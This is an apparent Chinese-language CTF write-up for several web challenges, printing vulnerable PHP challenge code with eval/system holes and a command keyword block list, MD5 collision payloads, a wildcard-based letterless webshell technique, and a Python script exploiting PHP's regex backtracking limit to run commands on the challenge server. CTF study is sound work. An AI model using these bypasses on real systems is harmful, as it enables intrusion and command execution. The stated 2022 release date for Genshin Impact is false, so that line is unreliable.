<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h2><p>友好的签到题，《原神》是一款由米哈游开发的开放世界冒险角色扮演游戏，于2022年9⽉28⽇正式发售。游戏的背景设定在⼀个名为提瓦特的幻想世界，玩家将扮演一个被神秘力量分离的旅行者，通过自定义外貌、技能和装备，探索这个充满奇幻和冒险的世界。<br>网页打开发现没有什么东西，考虑查看源码，发现右键和F12被禁⽤，那么采⽤其他方式进⾏源码查看：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">view-source: url</span><br><span class="line">curl url</span><br><span class="line">浏览器禁⽤js脚本</span><br><span class="line">浏览器相关插件等方式</span><br></pre></td></tr></table></figure>
<p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E8%AE%A1-Web/checkin.png" alt="checkin"></p>
<h2 id="Ez-PHP"><a href="#Ez-PHP" class="headerlink" title="Ez_PHP"></a>Ez_PHP</h2><p>include文件包含，使用伪协议php:&#x2F;&#x2F;filter进行读取即可。使⽤数组绕过经典MD5判断，路径中无意义的部分不会影响最后的读取<br><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E8%AE%A1-Web/Ez_PHP.jpg" alt="Ez_PHP"></p>
<p>随后获得base64加密的flag，解密即可。</p>
<h2 id="NormalBypass"><a href="#NormalBypass" class="headerlink" title="NormalBypass"></a>NormalBypass</h2><h2 id="NormalShell"><a href="#NormalShell" class="headerlink" title="NormalShell"></a>NormalShell</h2><p>原题代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;target&#x27;</span>]))&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Getting over it!&quot;</span>;  &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;   </span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;target&#x27;</span>];    </span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9_$@]+/&quot;</span>,<span class="variable">$res</span>))&#123;      </span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$res</span>);    &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;      </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Soon&#x27;</span>);    </span><br><span class="line">        &#125;  &#125;&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;  <span class="keyword">die</span>(<span class="string">&quot;NOT NOT YET!&quot;</span>);&#125;</span><br><span class="line"><span class="meta">?&gt;</span> NOT NOT YET!</span><br></pre></td></tr></table></figure>

<p>本题第一关经典MD5，通过MD5强碰撞解决：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">password=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>

<p>接下来的过滤⽐较严格，我们注意到返回报文里的PHP版本：<br><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E8%AE%A1-Web/Normal_Shell.jpg" alt="Normalshell"></p>
<p>参考无字母无数字webshell的此文章：<a href="https://www.freebuf.com/articles/web/186298.html">https://www.freebuf.com/articles/web/186298.html</a><br>这里的preg_match多了对@的限制，我们仍然使⽤linux的通配符进⾏匹配：<br>题目过滤数字，所以我们使用数字和@之间特殊字符进行匹配：<br><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E8%AE%A1-Web/NormalShell.jpg" alt="Normalshell2"></p>
<p>根据这些以及文章内容构造出恶意POST包即可进行任意命令执行：<br><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E8%AE%A1-Web/NormalShell_code.jpg" alt="Normalshell3"></p>
<h2 id="NormalUpload"><a href="#NormalUpload" class="headerlink" title="NormalUpload"></a>NormalUpload</h2><h2 id="NormalPreg"><a href="#NormalPreg" class="headerlink" title="NormalPreg"></a>NormalPreg</h2><p>原题代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?php</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$target</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line"><span class="variable">$code</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/php|cat|tac|assert|pcntl_exec|fwrite|curl|sleep|eval|system|assert|flag|shell_exec|passthru|exec|F10g|fl0g|fl1g|phar/i&quot;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$target</span>))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/but.*how/is&#x27;</span>,<span class="variable">$target</span>))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$target</span>,<span class="string">&#x27;but how&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">process</span>(<span class="variable">$code</span>));</span><br><span class="line">            </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;tip: backup file there&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;NO there&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?</span><br></pre></td></tr></table></figure>

<p>本题考点是利用php的正则回溯次数上限进行绕过，以及linux通配符，使用下面的脚本就能解决：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;target&#x27;</span>: BytesIO(<span class="string">b&#x27;but how&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">1000000</span>),</span><br><span class="line">    <span class="string">&#x27;code&#x27;</span>:BytesIO(<span class="string">b&#x27;tail /*lag&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(<span class="string">&#x27;http://ctf.v50to.cc:10074/&#x27;</span>,data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<p>关于一些比较常见的 Preg 绕过问题可以学习这篇文章：<a href="https://blog.csdn.net/q20010619/article/details/120091191">https://blog.csdn.net/q20010619/article/details/120091191</a></p>
<h2 id="Normal-unserialize"><a href="#Normal-unserialize" class="headerlink" title="Normal-unserialize"></a>Normal-unserialize</h2><h2 id="Ezxsssss"><a href="#Ezxsssss" class="headerlink" title="Ezxsssss"></a>Ezxsssss</h2><h2 id="newnew"><a href="#newnew" class="headerlink" title="newnew"></a>newnew</h2><h2 id="Loggggg"><a href="#Loggggg" class="headerlink" title="Loggggg"></a>Loggggg</h2>